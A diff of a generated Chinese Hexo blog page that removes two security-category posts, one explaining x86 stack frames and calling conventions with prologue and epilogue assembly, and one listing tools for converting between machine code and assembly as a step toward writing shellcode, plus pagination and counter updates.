-<p>在函数栈帧中，一般包含以下几类重要信息：<br>（1）局部变量：为函数局部变量开辟的内存空间。<br>（2）堆栈状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡计算得到），用于在本栈中被弹出后恢复出上一个栈帧。<br>（3）函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置，以便在函数返回时能够恢复到函数被调用前的代码区中继续执行指令。</p>
-<h3 id="4、函数调用约定与相关指令"><a href="#4、函数调用约定与相关指令" class="headerlink" title="4、函数调用约定与相关指令"></a>4、函数调用约定与相关指令</h3><p><b><center>几种调用方式的差异</center></b></p>
-<table>
-<thead>
-<tr>
-<th></th>
-<th>C</th>
-<th>SysCall</th>
-<th>StdCall</th>
-<th>BASIC</th>
-<th>FORTRAN</th>
-<th>PASCAL</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>参数入栈顺序</td>
-<td>右-&gt;左</td>
-<td>右-&gt;左</td>
-<td>右-&gt;左</td>
-<td>左-&gt;右</td>
-<td>左-&gt;右</td>
-<td>左-&gt;右</td>
-</tr>
-<tr>
-<td>恢复栈平衡操作的位置</td>
-<td>母函数</td>
-<td>子函数</td>
-<td>子函数</td>
-<td>子函数</td>
-<td>子函数</td>
-<td>子函数</td>
-</tr>
-</tbody>
-</table>
-<p><b><center>函数调用的约定</center></b></p>
-<table>
-<thead>
-<tr>
-<th>调用约定的声明</th>
-<th>参数入栈顺序</th>
-<th>恢复栈平衡的位置</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>__cdecl</td>
-<td>右-&gt;左</td>
-<td>母函数</td>
-</tr>
-<tr>
-<td>__fastcall</td>
-<td>右-&gt;左</td>
-<td>子函数</td>
-</tr>
-<tr>
-<td>__stdcall</td>
-<td>右-&gt;左</td>
-<td>子函数</td>
-</tr>
-</tbody>
-</table>
-<font color="#f00">默认情况下，VC会使用__stdcall调用方式</font>
-
-<font color="#f00">C++类成员函数都有一个this指针，在Windows平台中，这个指针一般是用ECX寄存器来传递的；但如果用GCC编译器编译，这个指针会作为最后一个参数压入栈中。</font>
-
-<p><b>参数调用步骤</b>：</p>
-<ol>
-<li>参数入栈：由右向左压入参数</li>
-<li>返回地址入栈：当前代码区调用指令的下一条指令地址压入栈中，供函数返回时继续执行</li>
-<li>代码区跳转：处理器从当前代码区跳转至被调用函数的入口处</li>
-<li>栈帧调整：保存当前栈帧状态值，以备后面恢复栈帧时使用（EBP入栈）；将当前栈帧切换到新栈帧（EBP&lt;-ESP，更新栈帧底部）；给新栈帧分配空间（将ESP减去所需空间的大小，抬高栈顶）</li>
-</ol>
-<pre><code>
-;调用前
-push 参数3    ;假设函数有3个参数，那么参数将由右向左依次入栈
-push 参数2
-push 参数1
-call 函数dizhi ;call指令将同时完成两项工作
-              ; a) 向栈中压入当前指令的下一条指令在内存中的位置，即保存返回地址
-              ; b) 跳转到所用函数的入口地址函数入口处
-push ebp    ;保存旧栈帧的底部
-mov ebp, esp    ;设置新栈帧的底部（栈帧切换）
-sub esp, xxx    ;设置新栈帧的顶部（抬高栈顶，为新栈帧开辟空间）
-</code></pre>
-
-<p><img src="/images/2017-06-22/stack_info.png" alt="函数调用时系统栈中的变化情况"></p>
-<p><b>函数返回时的步骤</b>：</p>
-<ol>
-<li>保存返回值（通常将函数的返回值保存到EAX中）</li>
-<li>弹出当前栈帧，恢复上一个栈帧：在栈帧平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收当前栈帧的空间；将当前栈帧底部保存的前栈帧EBP值弹入EBP寄存器，恢复上一个栈帧；将函数返回地址弹给EIP寄存器</li>
-<li>跳转：按照函数返回地址跳回母函数中继续执行</li>
-</ol>
-<pre><code>
-add esp, xxx    ;降低栈顶，回收当前的栈帧
-pop ebp            ;将上一个栈帧底部恢复到ebp
-retn            ;这条指令有两个功能
-                ;a) 弹出当前栈顶元素，即弹出栈帧中的返回地址。
-                ;b) 让处理器跳转至弹出的返回地址，恢复调用前的代码区
-</code></pre>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/22/机器代码与汇编代码的转换/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/06/22/机器代码与汇编代码的转换/" itemprop="url">机器代码与汇编代码的转换</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-22T14:32:31+08:00">
-                2017-06-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全技术/" itemprop="url" rel="index">
-                    <span itemprop="name">安全技术</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>机器代码与汇编代码之间的转换是写shellcode的一个十分重要的环节，所以这一讲主要讲使用那些工具能够方便的进行这两者之间的转换。</p>
-<p><br></p>
-<h4 id="Asm2MachineCode-x86"><a href="#Asm2MachineCode-x86" class="headerlink" title="Asm2MachineCode(x86)"></a>Asm2MachineCode(x86)</h4><font color="#0f0">这在吾爱破解工具包=&gt;编辑辅助工具</font>
-
-<p>该工具主要用于机器代码与汇编代码之间的转换，但是局限也很明显，这只能用于x86的机器。</p>
-<p><img src="/images/2017-06-22/Asm2MachineCode.jpg" alt="机器代码与汇编代码的转化"></p>
-<font color="#f00">需要说明的是，这个编辑器功能强大，十分适合用户进行shellcode的编写。但实际上shellcode的编写一般速度很慢，所以也不一定非用这个不可！</font>
-
-<p><br></p>
-<h4 id="C32asm"><a href="#C32asm" class="headerlink" title="C32asm"></a>C32asm</h4><font color="#0f0">这在吾爱破解工具包=&gt;反编译工具</font><br>使用其 工具-&gt;汇编代码查询<br><font colot="#f00">就目前而言，该功能只能从汇编代码转化为机器代码，所以局限性很强；而且一次只能转换一条指令。</font>
-
-
-<p><br></p>
-<h4 id="OllyDbg"><a href="#OllyDbg" class="headerlink" title="OllyDbg"></a>OllyDbg</h4><p>当导入某一运行的程序之后，可以看到运行程序中每条指令的二进制代码以及对应的汇编代码。</p>
-<p>当然，如果想要查看自己编写的汇编语言对应的机器代码，或者想找到机器代码对应的汇编语言，可以对主程序框中部分代码进行修改得到。</p>
-<font color="#foo">可能是了解的比较少，总觉得这么强大的调试工具应该会有十分实用的机器代码与汇编代码的转换工具，但是现在只是找到了上述所讲的那种笨办法！希望后续能够找到。。。</font>
-
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/11/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/13/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/11/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/13/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -3349,7 +3173,7 @@ retn            ;这条指令有两个功能
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">129</span>
+                <span class="site-state-item-count">132</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -3360,7 +3184,7 @@ retn            ;这条指令有两个功能
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-count">16</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -3371,7 +3195,7 @@ retn            ;这条指令有两个功能
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">54</span>
+                <span class="site-state-item-count">55</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -3596,6 +3420,8 @@ retn            ;这条指令有两个功能
 
 
   
+
+
 
 
 
